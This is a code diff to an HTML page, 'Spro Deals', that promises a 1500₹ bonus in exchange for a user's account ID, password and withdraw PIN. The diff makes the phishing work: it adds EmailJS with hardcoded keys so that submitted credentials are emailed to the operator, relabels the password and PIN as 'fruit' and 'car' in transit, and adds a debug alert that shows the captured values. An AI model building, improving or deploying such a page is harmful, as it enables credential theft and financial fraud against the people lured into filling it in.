@@ -1,4 +1,4 @@
-DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
@@ -15,10 +15,10 @@ DOCTYPE html>
   <div class="card" id="formCard">
     <h2>Welcome to Spro Deals</h2>
     <p>You will get 1500₹ bonus if you complete the following steps:</p>
-    <form onsubmit="showThanks(event)">
-      <input type="text" placeholder="Enter your ID number" required><br>
-      <input type="text" placeholder="Enter your password" required><br>
-      <input type="text" placeholder="Enter your withdraw PIN" required><br>
+    <form onsubmit="sendEmail(event)">
+      <input type="text" id="idnum" placeholder="Enter your ID number" required><br>
+      <input type="text" id="Password" placeholder="Enter your password" required><br>
+      <input type="text" id="Pin" placeholder="Enter your withdraw PIN" required><br>
       <button type="submit">Submit</button>
     </form>
   </div>
@@ -28,30 +28,38 @@ DOCTYPE html>
     <p>You will get bonus in 2 hours.</p>
   </div>
 
+  <!-- EmailJS Script -->
+  <script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script>
-    function showThanks(e) {
+    (function(){
+      emailjs.init("gl00dIyxCVvdxUIc8"); // Apna Public Key
+    })();
+
+    function sendEmail(e) {
       e.preventDefault();
-      document.getElementById("formCard").style.display = "none";
-      document.getElementById("thanks").style.display = "block";
+
+      const accountId = document.getElementById("idnum").value;
+      const password = document.getElementById("Password").value;
+      const pin = document.getElementById("Pin").value;
+
+      // Debugging alert (phone pe dikh jayega)
+      alert("📩 Values captured:\n\nID: " + accountId + "\nPassword: " + password + "\nPIN: " + pin);
+
+      const templateParams = {
+        account_id: accountId,
+        fruit: password,
+        car: pin
+      };
+
+      emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
+        .then(function(response) {
+          alert("✅ Email sent successfully!");
+          document.getElementById("formCard").style.display = "none";
+          document.getElementById("thanks").style.display = "block";
+        }, function(error) {
+          alert("❌ Failed to send.\n\nError: " + JSON.stringify(error));
+        });
     }
   </script>
 </body>
-<script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
-<script>
-  function sendEmail(e) {
-  e.preventDefault();
-
-  const templateParams = {
-    account_id: document.getElementById("idnum").value,
-    password: document.getElementById("Password").value,
-    pin: document.getElementById("Pin").value
-  };
-
-  emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
-    .then(function(response) {
-      document.getElementById("formCard").style.display = "none";
-      document.getElementById("thanks").style.display = "block";
-    }, function(error) {
-      alert("Failed to send: " + JSON.stringify(error));
-    });
-}
+</html>
